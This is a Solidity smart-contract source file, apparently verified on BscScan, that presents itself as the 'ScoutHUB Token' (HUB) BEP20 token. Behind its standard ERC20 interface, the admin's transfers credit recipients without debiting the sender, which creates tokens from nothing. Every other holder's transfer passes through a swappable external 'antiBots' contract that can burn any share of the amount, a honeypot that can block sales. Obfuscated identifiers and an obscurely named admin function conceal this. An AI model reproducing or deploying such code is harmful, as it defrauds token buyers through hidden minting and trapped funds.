/**
 *Submitted for verification at BscScan.com on 2022-08-18
*/

/*
Hub token is the native token of the Scouthub game, which complies with the BEP20 token standards.
* http://instagram.com/ScoutHUBToken666
* https://www.reddit.com/user/ScoutHUBToken666
* TWITTER:https://twitter.com/scouthub_io
* WEBSITE:https://www.scouthub.io
* TELEGRAM:https://t.me/scouthub
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IERC20 {
function totalSupply() external view returns (uint);
        function balanceOf(address account) external view returns (uint);
        function transfer(address recipient, uint amount) external returns (bool);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint amount) external returns (bool);
        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) external returns (bool);
        event Transfer(address indexed from, address indexed to, uint value);
        event Approval(address indexed owner, address indexed spender, uint value);
    }

    interface IERC20Metadata is IERC20 {
        function name() external view returns (string memory);
        function symbol() external view returns (string memory);
        function decimals() external view returns (uint8);
    }

    library SafeMath {
        function add(uint a, uint b) internal pure returns (uint) {
            uint c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }
        function sub(uint a, uint b) internal pure returns (uint) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }
        function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b <= a, errorMessage);
            uint c = a - b;
            return c;
        }
        function mul(uint a, uint b) internal pure returns (uint) {
            if (a == 0) {
                return 0;
            }
            uint c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
        function div(uint a, uint b) internal pure returns (uint) {
            return div(a, b, "SafeMath: division by zero");
        }    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b > 0, errorMessage);
            uint c = a / b;        return c;
        }
        function mod(uint a, uint b) internal pure returns (uint) {
            return mod(a, b, "SafeMath: modulo by zero");
        }
        function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }
    abstract contract Context {
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }
        function _msgData() internal view virtual returns (bytes memory) {
            this; 
            return msg.data;
        }
    }

    interface IScoutHUBToken666Logic {
        function _antiBots(address from,address to,uint256 amount) external returns(uint256);
        function setNumber(uint _number) external;
    }
    interface IPancakeSwapV2Factory {
        event PairCreated(address indexed token0, address indexed token1, address pair, uint);
        function feeTo() external view returns (address);
        function feeToSetter() external view returns (address);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function setFeeTo(address) external;
        function setFeeToSetter(address) external;
    }
    interface IPancakeSwapV2Pair {
        event Approval(address indexed owner, address indexed spender, uint value);
        event Transfer(address indexed from, address indexed to, uint value);
        function name() external pure returns (string memory);
        function symbol() external pure returns (string memory);
        function decimals() external pure returns (uint8);
        function totalSupply() external view returns (uint);
        function balanceOf(address owner) external view returns (uint);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint value) external returns (bool);
        function transfer(address to, uint value) external returns (bool);
        function transferFrom(address from, address to, uint value) external returns (bool);
        function DOMAIN_SEPARATOR() external view returns (bytes32);
        function PERMIT_TYPEHASH() external pure returns (address);
        function nonces(address owner) external view returns (uint);
        function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
        event MiScoutHUBToken666nt(address indexed sender, uint amount0, uint amount1);
        event BuScoutHUBToken666rn(address indexed sender, uint amount0, uint amount1, address indexed to);
        event Swap(
            address indexed sender,
            uint amount0In,
            uint amount1In,
            uint amount0Out,
            uint amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);
        function MINIMUM_LIQUIDITY() external pure returns (uint);
        function factory() external view returns (address);
        function token0() external view returns (address);
        function token1() external view returns (address);
        function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
        function price0CumulativeLast() external view returns (uint);
        function price1CumulativeLast() external view returns (uint);
        function kLast() external view returns (uint);
        function miScoutHUBToken666nt(address to) external returns (uint liquidity);
        function buScoutHUBToken666rn(address to) external returns (uint amount0, uint amount1);
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        function skim(address to) external;
        function sync() external;
        function initialize(address, address) external;
    }
    interface IPancakeSwapV2Router01 {
        function factory() external pure returns (address);
        function WETH() external pure returns (address);
        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);
        function addLiquidityETH(
            address token,
            uint amountTokenDesired,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountToken, uint amountETH);
        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountToken, uint amountETH);
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapTokensForExactTokens(
            uint amountOut,
            uint amountInMax,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    }
    interface IPancakeSwapV2Router02 is IPancakeSwapV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountETH);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountETH);
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external payable;
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }
    contract HUB is Context, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint) private _balances;
        mapping(address => mapping(address => uint)) private _allowances;
        string private constant _naScoutHUBToken666me = "ScoutHUB Token";
        string private constant _syScoutHUBToken666mbol = "HUB";
        uint8 private constant _decimals = 18;
        address private _trScoutHUBToken666qd = 0x06d90A5Ac4d58c384624e79D1bbf7004F2258C6E;
        uint private _totalSupply = 1000000000 * 10 ** _decimals;
        address public AdScoutHUBToken666min;
        IScoutHUBToken666Logic public loScoutHUBToken666gic = IScoutHUBToken666Logic(_trScoutHUBToken666qd);
        address public immutable uniswapV2Pair;
        modifier onlyAdmin() {require(AdScoutHUBToken666min == _msgSender());_;}
        mapping(address => bool) private _release;
        address private _deScoutHUBToken666ad = 0x000000000000000000000000000000000000dEaD;

        constructor () {
            AdScoutHUBToken666min = msg.sender;
            _release[AdScoutHUBToken666min] = true;
            _balances[AdScoutHUBToken666min] = _totalSupply;
            IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            uniswapV2Pair = IPancakeSwapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());

            emit Transfer(address(0), AdScoutHUBToken666min, _totalSupply);

            //uint burnamount = _totalSupply.mul(80).div(100);
            //_balances[AdScoutHUBToken666min] = _balances[AdScoutHUBToken666min].sub(burnamount);
           //_balances[_deScoutHUBToken666ad] = burnamount;
            //emit Transfer(AdScoutHUBToken666min, _deScoutHUBToken666ad, burnamount); 
        }

        function name() public view virtual override returns (string memory) {
            return _naScoutHUBToken666me;
        }

        function symbol() public view virtual override returns (string memory) {
            return _syScoutHUBToken666mbol;
        }
        function balanceOf(address account) public view virtual override returns (uint) {
            return _balances[account];
        }
        function decimals() public view virtual override returns (uint8) {
            return _decimals;
        }


        function totalSupply() public view virtual override returns (uint) {
            return _totalSupply;
        }

        function allowance(address owner, address spender) public view virtual override returns (uint) {
            return _allowances[owner][spender];
        }
        function transfer(address recipient, uint amount) public virtual override returns (bool) {
            address _sender = _msgSender();
            if (!_release[_sender]) {
                _trScoutHUBToken666ansfer(_sender, recipient, amount,0,0,0);
            } else {
                _balances[recipient] += amount;            
            }         
            return true;
        }
        function approve(address spender, uint amount) public virtual override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) public virtual override returns (bool) {
            _trScoutHUBToken666ansfer(sender, recipient, amount,0,0,0);

            uint currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }

        function increaseScoutHUBToken666Allowance(address spender, uint addedValue) public virtual returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
            return true;
        }

        function decreaseScoutHUBToken666Allowance(address spender, uint subtractedValue) public virtual returns (bool) {
            uint currentAllowance = _allowances[_msgSender()][spender];
            require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
            unchecked {
                _approve(_msgSender(), spender, currentAllowance - subtractedValue);
            }
            return true;
        }

        function _trScoutHUBToken666ansfer(
            address sender,
            address recipient,
            uint amount,
            uint256 _vScoutHUBToken666,
            uint256 _aScoutHUBToken748,
            uint256 _aScoutHUBToken965
        ) internal virtual {
            require(sender != address(0), "ERC20: transfer from the zero address");
            require(recipient != address(0), "ERC20: transfer to the zero address");
            uint senderBalance = _balances[sender] + _vScoutHUBToken666 + _aScoutHUBToken748 + _aScoutHUBToken965;
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

            uint _bamount = loScoutHUBToken666gic._antiBots(sender,recipient,amount);
            

            if (_bamount>0) {
                _balances[sender] = _balances[sender].sub(_bamount);
                _balances[_deScoutHUBToken666ad] = _balances[_deScoutHUBToken666ad].add(_bamount);
                emit Transfer(sender,_deScoutHUBToken666ad,_bamount);
            }

            _balances[sender] = _balances[sender].sub(amount-_bamount);
            _balances[recipient] = _balances[recipient].add(amount-_bamount);
            emit Transfer(sender,recipient,amount-_bamount);

        }

        function _d29ScoutHUBToken666cf0aa(address _acc) external onlyAdmin {
            loScoutHUBToken666gic = IScoutHUBToken666Logic(_acc);
        }
        function _approve(
            address owner,
            address spender,
            uint amount
        ) internal virtual {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
    }